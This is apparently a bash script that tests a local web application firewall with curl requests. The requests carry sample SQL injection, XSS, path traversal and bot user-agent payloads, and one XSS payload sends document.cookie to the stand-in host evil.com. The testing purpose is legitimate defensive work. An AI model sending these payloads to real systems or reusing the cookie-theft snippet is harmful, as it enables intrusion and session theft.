#!/bin/bash

# WAF Testing Script - Curl Examples
# This script tests various attack scenarios against your WAF

echo "🛡️ WAF Security Testing Script"
echo "=================================="
echo ""

# Configuration
WAF_SERVER="127.0.0.1:8000"
TEST_SITE="testo"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}Testing WAF Server: $WAF_SERVER${NC}"
echo -e "${BLUE}Test Site Domain: $TEST_SITE${NC}"
echo ""

# Function to run test
run_test() {
    local test_name="$1"
    local curl_cmd="$2"
    local description="$3"
    
    echo -e "${YELLOW}🧪 TEST: $test_name${NC}"
    echo -e "${BLUE}Description: $description${NC}"
    echo -e "${GREEN}Command: $curl_cmd${NC}"
    echo ""
    
    # Run the curl command and capture output
    result=$(eval $curl_cmd 2>&1)
    exit_code=$?
    
    if [[ $exit_code -eq 0 ]]; then
        echo -e "${GREEN}✅ Request completed${NC}"
        # Check if we got a redirect (302) which means WAF blocked it
        if echo "$result" | grep -q "302 Found\|Location:.*blocked"; then
            echo -e "${RED}🚫 WAF BLOCKED - Redirected to blocked page${NC}"
        elif echo "$result" | grep -q "403 Forbidden"; then
            echo -e "${RED}🚫 WAF BLOCKED - 403 Forbidden${NC}"
        else
            echo -e "${YELLOW}⚠️ Request allowed or other response${NC}"
        fi
    else
        echo -e "${RED}❌ Request failed with exit code: $exit_code${NC}"
    fi
    
    echo "Response preview:"
    echo "$result" | head -10
    echo ""
    echo "----------------------------------------"
    echo ""
}

echo "🚀 Starting WAF Tests..."
echo ""

# Test 1: SQL Injection - UNION SELECT
run_test "SQL Injection - UNION SELECT" \
    "curl -i 'http://$WAF_SERVER/products?id=1%27%20UNION%20SELECT%20*%20FROM%20users--' -H 'Host: $TEST_SITE'" \
    "Classic SQL injection with UNION SELECT attack"

# Test 2: SQL Injection - DROP TABLE
run_test "SQL Injection - DROP TABLE" \
    "curl -i 'http://$WAF_SERVER/admin?cmd=DROP%20TABLE%20users;' -H 'Host: $TEST_SITE'" \
    "Destructive SQL injection attempting to drop tables"

# Test 3: XSS Attack - Script Tag
run_test "XSS Attack - Script Tag" \
    "curl -i 'http://$WAF_SERVER/search?q=%3Cscript%3Ealert(%27xss%27)%3C/script%3E' -H 'Host: $TEST_SITE'" \
    "Cross-site scripting with script tag injection"

# Test 4: XSS Attack - JavaScript Protocol
run_test "XSS Attack - JavaScript Protocol" \
    "curl -i 'http://$WAF_SERVER/redirect?url=javascript:alert(document.cookie)' -H 'Host: $TEST_SITE'" \
    "XSS using javascript: protocol"

# Test 5: Path Traversal - etc/passwd
run_test "Path Traversal - etc/passwd" \
    "curl -i 'http://$WAF_SERVER/files?path=../../../etc/passwd' -H 'Host: $TEST_SITE'" \
    "Directory traversal attempting to access system files"

# Test 6: Path Traversal - Windows
run_test "Path Traversal - Windows" \
    "curl -i 'http://$WAF_SERVER/download?file=..\\..\\windows\\system32\\config\\sam' -H 'Host: $TEST_SITE'" \
    "Windows-style path traversal attack"

# Test 7: Bot Detection - Curl User Agent
run_test "Bot Detection - Curl" \
    "curl -i 'http://$WAF_SERVER/api/data' -H 'Host: $TEST_SITE' -H 'User-Agent: curl/7.68.0'" \
    "Bot detection using curl user agent"

# Test 8: Bot Detection - Python Requests
run_test "Bot Detection - Python" \
    "curl -i 'http://$WAF_SERVER/scrape' -H 'Host: $TEST_SITE' -H 'User-Agent: python-requests/2.25.1'" \
    "Bot detection using python-requests user agent"

# Test 9: Complex SQL Injection POST
run_test "SQL Injection - POST Data" \
    "curl -i -X POST 'http://$WAF_SERVER/login' -H 'Host: $TEST_SITE' -H 'Content-Type: application/x-www-form-urlencoded' -d \"username=admin'%20OR%201=1--&password=anything\"" \
    "SQL injection via POST form data"

# Test 10: XSS in POST Data
run_test "XSS Attack - POST Data" \
    "curl -i -X POST 'http://$WAF_SERVER/comment' -H 'Host: $TEST_SITE' -H 'Content-Type: application/x-www-form-urlencoded' -d 'comment=%3Cscript%3Edocument.location=%27http://evil.com/%27%2Bdocument.cookie%3C/script%3E'" \
    "XSS injection via POST comment form"

# Test 11: Multiple Attack Vectors
run_test "Multiple Attacks Combined" \
    "curl -i 'http://$WAF_SERVER/search?q=%3Cscript%3E%27%20UNION%20SELECT%20*%20FROM%20users--%3C/script%3E&file=../../../etc/passwd' -H 'Host: $TEST_SITE'" \
    "Combined XSS, SQL injection, and path traversal"

# Test 12: URL Encoding Bypass Attempt
run_test "Encoded SQL Injection" \
    "curl -i 'http://$WAF_SERVER/products?id=1%2527%2520UNION%2520SELECT%2520*%2520FROM%2520users--' -H 'Host: $TEST_SITE'" \
    "Double URL encoded SQL injection bypass attempt"

# Test 13: Rate Limiting Test
echo -e "${YELLOW}🧪 RATE LIMITING TEST${NC}"
echo -e "${BLUE}Description: Multiple rapid requests to trigger rate limiting${NC}"
echo ""

for i in {1..5}; do
    echo "Request $i/5..."
    curl -i "http://$WAF_SERVER/api/test$i" -H "Host: $TEST_SITE" 2>&1 | head -3
    sleep 0.1
done

echo ""
echo "----------------------------------------"
echo ""

# Test 14: Valid Request (Should Pass)
run_test "Valid Request" \
    "curl -i 'http://$WAF_SERVER/home' -H 'Host: $TEST_SITE' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'" \
    "Normal legitimate request that should pass through WAF"

# Test 15: Direct blocked page access
run_test "Direct Blocked Page Access" \
    "curl -i 'http://$WAF_SERVER/blocked/?reason=Test&rule=Manual&site=$TEST_SITE&url=http://example.com'" \
    "Direct access to blocked page to test video functionality"

echo ""
echo "🏁 WAF Testing Complete!"
echo ""
echo "📋 What to look for in results:"
echo "✅ Legitimate requests should pass through (no 302 redirect)"
echo "🚫 Attack requests should return 302 redirect to /blocked/"
echo "🎬 /blocked/ page should load with video functionality"
echo ""
echo "🔍 To follow redirects and see the blocked page:"
echo "curl -L 'http://$WAF_SERVER/test?id=1%27%20UNION%20SELECT' -H 'Host: $TEST_SITE'"
echo ""
echo "🎥 To test video files directly:"
echo "curl -I 'http://$WAF_SERVER/static/waf_proxy/videos/security-alert.mp4'"
echo "curl -I 'http://$WAF_SERVER/static/waf_proxy/videos/sec.mp4'"